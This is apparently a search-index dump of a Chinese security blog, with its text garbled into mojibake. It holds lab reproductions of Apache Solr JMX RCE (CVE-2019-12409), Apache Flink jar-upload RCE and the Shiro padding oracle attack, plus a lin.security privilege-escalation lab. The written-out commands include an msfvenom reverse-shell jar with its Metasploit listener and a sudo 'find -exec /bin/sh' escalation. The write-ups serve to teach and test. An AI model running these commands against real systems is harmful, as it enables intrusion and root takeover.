æ–‡ä»¶ï¼Œé‚£ä¹ˆå°†å¯ç”¨JMXç›‘è§†å¹¶å°†å…¶æš´éœ²åœ¨ RMI_PORT ä¸Šï¼ˆé»˜è®¤å€¼ = 18983ï¼‰ï¼Œå¹¶ä¸”æ— éœ€è¿›è¡Œä»»ä½•èº«ä»½éªŒè¯ã€‚ å¦‚æœé˜²ç«å¢™ä¸­çš„å…¥ç«™æµé‡æ‰“å¼€äº†æ­¤ç«¯å£ï¼Œåˆ™å…·æœ‰ Solr èŠ‚ç‚¹ç½‘ç»œè®¿é—®æƒé™çš„ä»»ä½•äººéƒ½å°†èƒ½å¤Ÿè®¿é—® JMXï¼Œå¹¶ä¸”å¯ä»¥ä¸Šä¼ æ¶æ„ä»£ç åœ¨ Solr æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚ è¯¥æ¼æ´ä¸å½±å“ Windows ç³»ç»Ÿçš„ç”¨æˆ·,ä»…å½±å“éƒ¨åˆ†ç‰ˆæœ¬çš„ Linux ç”¨æˆ·ã€‚ ","date":"2019-11-20","objectID":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"CVE-2019-12409 æ¼æ´å¤ç°","uri":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"ç¯å¢ƒæ­å»º å†™å…¥ docker-compose.yml æ–‡ä»¶ï¼š version: '2' services: solr: image: vulhub/solr:8.1.1 ports: - \"8983:8983\" - \"18983:18983\" è¿è¡Œæ¼æ´ç¯å¢ƒï¼š docker-compose up -d docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db æŸ¥çœ‹ Docker é¶æœºç¯å¢ƒæ˜¯å¦å¼€å¯äº†æ¼æ´é…ç½®ï¼š docker ps -a #æŸ¥çœ‹å½“å‰è¿è¡Œå®¹å™¨çš„CONTAINER ID docker exec -it CONTAINER ID /bin/bash #dockerçš„solrçš„é…ç½®æ–‡ä»¶é»˜è®¤åœ¨/etc/defaulté‡Œé¢ cat /etc/default/solr.in.sh |grep true #å¦‚ä¸‹å›¾æ˜¾ç¤ºå³ä¸ºå¼€å¯çš„æ¼æ´é…ç½® æµè§ˆå™¨è®¿é—®ï¼šhttp://IP:8983ï¼Œå³å¯æŸ¥çœ‹åˆ° Apache solr çš„ç®¡ç†é¡µé¢ï¼Œæ— éœ€ç™»å½•ã€‚ ","date":"2019-11-20","objectID":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"CVE-2019-12409 æ¼æ´å¤ç°","uri":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´å¤ç° æ‰“å¼€ msfï¼Œé…ç½® payload è®¾ç½®æ”»å‡»è€…ä¸å—å®³è€… IP æ‰§è¡Œ ","date":"2019-11-20","objectID":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"CVE-2019-12409 æ¼æ´å¤ç°","uri":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Flink ä»»æ„ Jar åŒ…ä¸Šä¼ å¯¼è‡´ RCE æ¼æ´å¤ç°","date":"2019-11-20","objectID":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/","tags":["Flink","æ¼æ´å¤ç°"],"title":"Apache Flink ä»»æ„ Jar åŒ…ä¸Šä¼ å¯¼è‡´ RCE æ¼æ´","uri":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Flink ä»»æ„ Jar åŒ…ä¸Šä¼ å¯¼è‡´ RCE æ¼æ´ Apache Flink æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼å¤§æ•°æ®å¤„ç†å¼•æ“ï¼Œå¯å¯¹æœ‰é™æ•°æ®æµå’Œæ— é™æ•°æ®æµè¿›è¡Œæœ‰çŠ¶æ€è®¡ç®—ã€‚å¯éƒ¨ç½²åœ¨å„ç§é›†ç¾¤ç¯å¢ƒï¼Œå¯¹å„ç§å¤§å°çš„æ•°æ®è§„æ¨¡è¿›è¡Œå¿«é€Ÿè®¡ç®—ã€‚ ApacheFlink æ˜¯ç”± Apache è½¯ä»¶åŸºé‡‘ä¼šå¼€å‘çš„å¼€æºæµå¤„ç†æ¡†æ¶ï¼Œå…¶æ ¸å¿ƒæ˜¯ç”¨ Java å’Œ Scala ç¼–å†™çš„åˆ†å¸ƒå¼æµæ•°æ®æµå¼•æ“ã€‚Flink ä»¥æ•°æ®å¹¶è¡Œå’Œæµæ°´çº¿æ–¹å¼æ‰§è¡Œä»»æ„æµæ•°æ®ç¨‹åºï¼ŒFlink çš„æµæ°´çº¿è¿è¡Œæ—¶ç³»ç»Ÿå¯ä»¥æ‰§è¡Œæ‰¹å¤„ç†å’Œæµå¤„ç†ç¨‹åºã€‚æ­¤å¤–ï¼ŒFlink çš„è¿è¡Œæ—¶æœ¬èº«ä¹Ÿæ”¯æŒè¿­ä»£ç®—æ³•çš„æ‰§è¡Œã€‚ æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´åœ¨ Apache Flink Dashboard é¡µé¢ä¸­ä¸Šä¼ ä»»æ„ Jar åŒ…ï¼Œåˆ©ç”¨ Metasploit åœ¨Apache Flink æœåŠ¡å™¨ä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼Œè·å–æœåŠ¡å™¨æœ€é«˜æƒé™ï¼Œæ‰€ä»¥å±å®³æ€§è¾ƒå¤§ã€‚ ","date":"2019-11-20","objectID":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/:0:0","tags":["Flink","æ¼æ´å¤ç°"],"title":"Apache Flink ä»»æ„ Jar åŒ…ä¸Šä¼ å¯¼è‡´ RCE æ¼æ´","uri":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"å½±å“èŒƒå›´ Apache Flink \u003c= 1.9.1 ","date":"2019-11-20","objectID":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/:1:0","tags":["Flink","æ¼æ´å¤ç°"],"title":"Apache Flink ä»»æ„ Jar åŒ…ä¸Šä¼ å¯¼è‡´ RCE æ¼æ´","uri":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"ç¯å¢ƒæ­å»º ä¸‹è½½ Apache Flink 1.9.1 åŒ…ï¼š wget http://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz è§£å‹å®‰è£…åŒ…ï¼š tar â€“zxvf flink-1.9.1-bin-scala_2.11.tgz è¿›å…¥åˆ° bin ç›®å½•ä¸‹é¢å¯åŠ¨ Flinkï¼š ./start-cluster.sh æµè§ˆå™¨è®¿é—®ï¼šhttp://IP:8081 ","date":"2019-11-20","objectID":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/:2:0","tags":["Flink","æ¼æ´å¤ç°"],"title":"Apache Flink ä»»æ„ Jar åŒ…ä¸Šä¼ å¯¼è‡´ RCE æ¼æ´","uri":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´å¤ç° msf ç”Ÿæˆ reverse shell çš„é©¬ msfvenom -p java/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f jar \u003e shell.jar msf è®¾ç½®ç›‘å¬ use exploit/multi/handler set payload java/shell/reverse_tcp expolit ä¸Šä¼  shell.jar å¹¶æäº¤ åå¼¹å›çš„ shell ","date":"2019-11-20","objectID":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/:3:0","tags":["Flink","æ¼æ´å¤ç°"],"title":"Apache Flink ä»»æ„ Jar åŒ…ä¸Šä¼ å¯¼è‡´ RCE æ¼æ´","uri":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"ä¿®å¤å»ºè®® å°† Apache Flink å‡çº§æœ€æ–°ç‰ˆæœ¬ ","date":"2019-11-20","objectID":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/:4:0","tags":["Flink","æ¼æ´å¤ç°"],"title":"Apache Flink ä»»æ„ Jar åŒ…ä¸Šä¼ å¯¼è‡´ RCE æ¼æ´","uri":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Shiro padding oracle attackæ¼æ´å¤ç°","date":"2019-11-18","objectID":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["æ¼æ´å¤ç°","Shiro"],"title":"Apache Shiro padding oracle attackæ¼æ´å¤ç°","uri":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Shiro padding oracle attackæ¼æ´å¤ç° Shiro ä½¿ç”¨äº† AES-128-CBC æ¨¡å¼å¯¹ cookie è¿›è¡ŒåŠ å¯†ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·å¯ä»¥é€šè¿‡ padding oracle æ”»å‡»æ–¹å¼æ„é€ åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚ ä¾‹å¦‚ä¹‹å‰çˆ†å‡ºæ¥çš„ SHIRO-550 æ¼æ´å°±æ˜¯å…³äº remember è¿™ä¸ªcookie çš„é—®é¢˜ã€‚ ","date":"2019-11-18","objectID":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["æ¼æ´å¤ç°","Shiro"],"title":"Apache Shiro padding oracle attackæ¼æ´å¤ç°","uri":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"ç¯å¢ƒæ­å»º shiro æ‰“åŒ…ç¯å¢ƒä¸‹è½½åœ°å€ https://github.com/jas502n/SHIRO-721 exp ä¸‹è½½åœ°å€ https://github.com/Geekby/shiro_rce_exp å¤ç°ç¯å¢ƒï¼šubuntu16.04 + tomcat8 + shiro 1.4.1 apt-get install tomcat8 tomcat8-docs tomcat8-examples tomcat8-admin ç„¶åå°†ä¸‹è½½å¥½çš„ samples-web-1.4.1.war åŒ…éƒ¨ç½²åˆ° tomcat ä¸Šã€‚ ","date":"2019-11-18","objectID":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["æ¼æ´å¤ç°","Shiro"],"title":"Apache Shiro padding oracle attackæ¼æ´å¤ç°","uri":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´å¤ç° è®¿é—®shiroç™»å½•é¡µé¢ è¾“å…¥ç”¨æˆ·åå¯†ç ï¼Œç‚¹å‡» Remember Me è®¿é—®ä»»æ„é¡µé¢ï¼Œå¾—åˆ° Cookie ä¸­çš„ rememberMe ç”Ÿæˆ java class payload æ‰§è¡Œexp å¾—åˆ°padding oracle attackåçš„cookie æ³¨ï¼šç ´è§£æ—¶é—´è¾ƒé•¿ï¼Œå¤§æ¦‚æŒç»­100min - 120minå·¦å³ã€‚ å¤åˆ¶è¯¥cookieï¼Œé‡æ”¾æ•°æ®åŒ… æ£€æŸ¥æ‰§è¡Œç»“æœ å‘ç°successæ–‡ä»¶æˆåŠŸè¢«åˆ›å»ºï¼Œå‘½ä»¤å¯ä»¥è¢«æ‰§è¡Œ ","date":"2019-11-18","objectID":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["æ¼æ´å¤ç°","Shiro"],"title":"Apache Shiro padding oracle attackæ¼æ´å¤ç°","uri":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"å‚è€ƒ https://www.anquanke.com/post/id/192819 https://github.com/jas502n/SHIRO-721 https://github.com/wuppp/shiro_rce_exp ","date":"2019-11-18","objectID":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:0","tags":["æ¼æ´å¤ç°","Shiro"],"title":"Apache Shiro padding oracle attackæ¼æ´å¤ç°","uri":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["é¶åœº"],"content":"in.security ææƒé¶åœº","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"in.security ææƒé¶åœº lin.security é¶åœº æ˜¯ Linux é…ç½®é—®é¢˜å¯¼è‡´ææƒçš„é¶åœºï¼Œå®ƒåŸºäºUbuntuï¼ˆ18.04 LTSï¼‰çš„ Linux è™šæ‹Ÿæœºï¼Œé¶åœºæä¾›è®¸å¤šæƒé™æå‡çš„æ¼æ´ä¾›æˆ‘ä»¬ç»ƒä¹ å…³äº linux æƒé™çš„ç›¸å…³çŸ¥è¯†ï¼Œä¸‹é¢æ˜¯è¿™ä¸ªé¶åœºçš„ä¸‹è½½é“¾æ¥ï¼š https://in.security/downloads/lin.security_v1.0.ova é¶åœºä½æƒé™ç”¨æˆ·ï¼šbob:secret æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™ï¼šwhoamiã€id æŸ¥çœ‹ç³»ç»Ÿçš„å‘è¡Œç‰ˆæœ¬å’Œå†…æ ¸ç‰ˆæœ¬ï¼šlsb_release -aã€uname -a ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:0:0","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"1 linux ä¸‹çš„æƒé™åˆ’åˆ† ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:1:0","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"1.1 ç”¨æˆ·å’Œç»„ ç”¨æˆ·ç»„åœ¨ linux ç³»ç»Ÿä¸Šèµ·ç€é‡è¦ä½œç”¨ï¼Œå®ƒä»¬ä¸ºé€‰å®šçš„ç”¨æˆ·æä¾›äº†ä¸€ç§å½¼æ­¤å…±äº«æ–‡ä»¶çš„ç®€ä¾¿æ–¹æ³•ã€‚å®ƒä»¬è¿˜ä½¿ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥æ›´æœ‰æ•ˆåœ°ç®¡ç†ç”¨æˆ·æƒé™ï¼Œå› ä¸ºä»–ä»¬å¯ä»¥å°†æƒé™åˆ†é…ç»™ç»„è€Œä¸æ˜¯å•ä¸ªç”¨æˆ·ã€‚ Linux ç”¨æˆ·åˆ†ä¸ºç®¡ç†å‘˜å’Œæ™®é€šç”¨æˆ·ï¼Œæ™®é€šç”¨æˆ·åˆåˆ†ä¸ºç³»ç»Ÿç”¨æˆ·å’Œè‡ªå®šä¹‰ç”¨æˆ·ã€‚ ç³»ç»Ÿç®¡ç†å‘˜ï¼šå³ root å¸æˆ·ï¼ŒUID å·ä¸º 0ï¼Œæ‹¥æœ‰æ‰€æœ‰ç³»ç»Ÿæƒé™ï¼Œå®ƒç±»ä¼¼äº Windows ç³»ç»Ÿä¸­çš„ administrator å¸æˆ·ï¼Œæ˜¯æ•´ä¸ªç³»ç»Ÿçš„æ‰€æœ‰è€…ã€‚ ç³»ç»Ÿç”¨æˆ·ï¼šLinux ä¸ºæ»¡è¶³è‡ªèº«ç³»ç»Ÿç®¡ç†æ‰€å†…å»ºçš„è´¦å·ï¼Œé€šå¸¸åœ¨å®‰è£…è¿‡ç¨‹ä¸­è‡ªåŠ¨åˆ›å»ºï¼Œä¸èƒ½ç”¨äºç™»å½•æ“ä½œç³»ç»Ÿã€‚UID åœ¨ 1-499 ä¹‹é—´(Centos 7 ä¸º 1-999 ä¹‹é—´)ã€‚åƒä¸Šé¢çš„ sshdã€ pulse ç­‰ç­‰ç”¨æˆ·å³æ˜¯æ­¤ç±»ç”¨æˆ·ã€‚å®ƒç±»ä¼¼äº Windows ä¸­çš„ system å¸æˆ·ï¼Œå½“ç„¶æƒé™è¿œæ²¡æœ‰ system å¸æˆ·é«˜ã€‚ è‡ªå®šä¹‰ç”¨æˆ·ï¼šç”± root ç®¡ç†å‘˜åˆ›å»ºä¾›ç”¨æˆ·ç™»å½•ç³»ç»Ÿè¿›è¡Œæ“ä½œä½¿ç”¨çš„è´¦å·ï¼ŒUID åœ¨ 500 ä»¥ä¸Š(CentOS7 ä¸º 1000 ä»¥ä¸Š)ã€‚å®ƒç±»ä¼¼äº Windows ç³»ç»Ÿä¸­ users ç”¨æˆ·ç»„ä¸­çš„å¸æˆ·ã€‚ åœ¨ Linux ä¸­çš„æ¯ä¸ªç”¨æˆ·å¿…é¡»å±äºä¸€ä¸ªç»„ï¼Œä¸èƒ½ç‹¬ç«‹äºç»„å¤–åœ¨ Linux ä¸­æ¯ä¸ªæ–‡ä»¶æœ‰æ‰€æœ‰è€…ã€æ‰€åœ¨ç»„ã€å…¶å®ƒç»„çš„æ¦‚å¿µåŒæ ·ï¼Œç”¨æˆ·ç»„çš„ä¿¡æ¯æˆ‘ä»¬å¯ä»¥åœ¨ /etc/group ä¸­æŸ¥çœ‹ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:1:1","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"1.2 /etc/passwd æ–‡ä»¶ åœ¨ Linux çš„ /etc/passwd æ–‡ä»¶ä¸­æ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„è®°å½•è¡Œï¼Œå®ƒè®°å½•äº†è¿™ä¸ªç”¨æˆ·çš„ä¸€äº›åŸºæœ¬å±æ€§ã€‚ç³»ç»Ÿç®¡ç†å‘˜ç»å¸¸ä¼šæ¥è§¦åˆ°è¿™ä¸ªæ–‡ä»¶çš„ä¿®æ”¹ä»¥å®Œæˆå¯¹ç”¨æˆ·çš„ç®¡ç†å·¥ä½œã€‚ ç»™ linux ç³»ç»Ÿæ·»åŠ è´¦æˆ·ï¼šuseradd -g group -d /home/to/user -m username å­—æ®µå«ä¹‰ï¼š ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:1:2","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"1.3 /etc/shadow æ–‡ä»¶ å­—æ®µå«ä¹‰ï¼š ç”¨æˆ·å:åŠ å¯†å¯†ç (! ! è¡¨ç¤ºæ— å¯†ç ):æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´:æœ€å°ä¿®æ”¹æ—¶é—´é—´éš”:å¯†ç æœ‰æ•ˆæœŸ:å¯†ç éœ€è¦å˜æ›´å‰çš„è­¦å‘Šå¤©æ•°:å¯†ç è¿‡æœŸåçš„å®½é™æ—¶é—´:è´¦å·å¤±æ•ˆæ—¶é—´:ä¿ç•™å­—æ®µ åŠ å¯†çš„å¯†ç å…·æœ‰å›ºå®šæ ¼å¼ï¼š $id$salt$encrypted id è¡¨ç¤ºåŠ å¯†ç®—æ³•ï¼Œ1 ä»£è¡¨ MD5ï¼Œ5 ä»£è¡¨ SHA-256ï¼Œ6 ä»£è¡¨ SHA-512 salt ä¸ºç›å€¼ï¼Œç³»ç»Ÿéšæœºç”Ÿæˆ encrypted è¡¨ç¤ºå¯†ç çš„ hash å€¼ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:1:3","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"1.4 æ–‡ä»¶æƒé™ linux ç³»ç»Ÿä¸­ï¼Œä¸€åˆ‡çš†æ–‡ä»¶ï¼ŒåŒ…æ‹¬æ™®é€šæ–‡ä»¶ã€ç›®å½•ã€è®¾å¤‡ã€å¥—æ¥å­—ç­‰ rwxå¯¹ç›®å½•çš„æƒé™ rï¼šè¡¨ç¤ºå…·æœ‰è¯»å–ç›®å½•ç»“æ„åˆ—è¡¨çš„æƒé™ï¼Œè¡¨ç¤ºå¯ä»¥æŸ¥è¯¢è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶åæ•°æ®ã€‚ å³å¯ä»¥ ls wï¼šè¡¨ç¤ºå¯ä»¥å¯¹è¯¥æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶æˆ–ç›®å½•è¿›è¡Œæ·»åŠ ã€åˆ é™¤ã€é‡å‘½åã€å¤åˆ¶ã€å‰ªåˆ‡ç­‰æ“ä½œ xï¼šè¡¨ç¤ºå¯ä»¥ç”¨æˆ·èƒ½å¦è¿›å…¥è¯¥ç›®å½•æˆä¸ºå·¥ä½œç›®å½•ï¼ˆå½“æ²¡æœ‰ x æƒé™ï¼Œä½†æ˜¯æœ‰ w æƒé™æ—¶ï¼Œä¹Ÿæ˜¯æ— æ³•å‘æ–‡ä»¶å†™å…¥æ–‡ä»¶çš„ï¼‰ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:1:4","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"1.5 ç‰¹æ®Šæƒé™ SUID è¯¥æ–‡ä»¶åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šåˆ‡æ¢åˆ°æ‰€æœ‰è€…çš„æƒé™æ‰§è¡Œ SGID è¯¥æ–‡ä»¶åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šåˆ‡æ¢åˆ°æ‰€æœ‰ç»„çš„æƒé™æ‰§è¡Œ SBIT åªæœ‰è‡ªå·±å’Œç®¡ç†å‘˜å¯ä»¥æ“ä½œå½“å‰æ–‡ä»¶ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:1:5","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"2 sudo æƒé™é…ç½®ä¸å½“ææƒ sudo å…¶å®æ˜¯å¾ˆå¸¸ç”¨çš„å‘½ä»¤äº†ï¼Œsudo æƒé™åˆ™æ˜¯ root æŠŠæœ¬æ¥åªèƒ½è¶…çº§ç”¨æˆ·æ‰§è¡Œçš„å‘½ä»¤èµ‹äºˆæ™®é€šç”¨æˆ·æ‰§è¡Œï¼Œè¿™é‡Œçš„å‘½ä»¤æŒ‡çš„æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œå¯¹äº linux æ¥è¯´ä¸€åˆ‡çš†æ˜¯æ–‡ä»¶ï¼Œæ‰€ä»¥ç³»ç»Ÿå‘½ä»¤ä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶ã€‚ ä¸€èˆ¬æ¥è®²å½“ç®¡ç†å‘˜éœ€è¦æŸä¸ªç”¨æˆ·åœ¨æ‰§è¡Œ root æƒé™çš„å‘½ä»¤æ—¶ï¼Œä¼šå»é…ç½® sudoã€‚å…·ä½“æ˜¯ä¿®æ”¹ /etc/sudoers è¿™ä¸ªæ–‡ä»¶ã€‚ä½†æ˜¯æ™®é€šç”¨æˆ·å…¶å®æ˜¯æŸ¥çœ‹å’Œæ“ä½œè¿™ä¸ªæ–‡ä»¶çš„ï¼Œä»–åªèƒ½æŸ¥çœ‹è‡ªå·±æ˜¯å¦è¢«é…ç½®äº† sudo æƒé™ã€‚æ™®é€šç”¨æˆ·å¯ä»¥é‡‡ç”¨ sudo -l è¿™ä¸ªå‘½ä»¤æ¥æŸ¥çœ‹è‡ªå·±æ˜¯å¦æœ‰ sudo é…ç½®ã€‚ bob è¿™ä¸ªç”¨æˆ·å¯ä»¥æ‰§è¡Œå¾ˆå¤šçš„å‘½ä»¤ï¼Œåˆ©ç”¨è¿™äº›å‘½ä»¤å¯ä»¥ç®€å•ç›´æ¥æå‡åˆ° root æƒé™ã€‚ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:2:0","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"2.1 /bin/ash ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:2:1","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"2.2 /usr/bin/awk æŸ¥çœ‹å¯†ç æ–‡ä»¶ /etc/shadow ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:2:2","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"2.3 /usr/bin/curl ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:2:3","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"2.4 /usr/bin/find è·å–shell find . -exec /bin/sh \\; -quit å¯ä»¥å‘ç°ï¼Œå“ªæ€•æ˜¯ find è¿™ç§æŸ¥æ‰¾å‘½ä»¤è¢«èµ‹äºˆäº† sudoï¼Œä¹Ÿèƒ½ææƒä¸º root 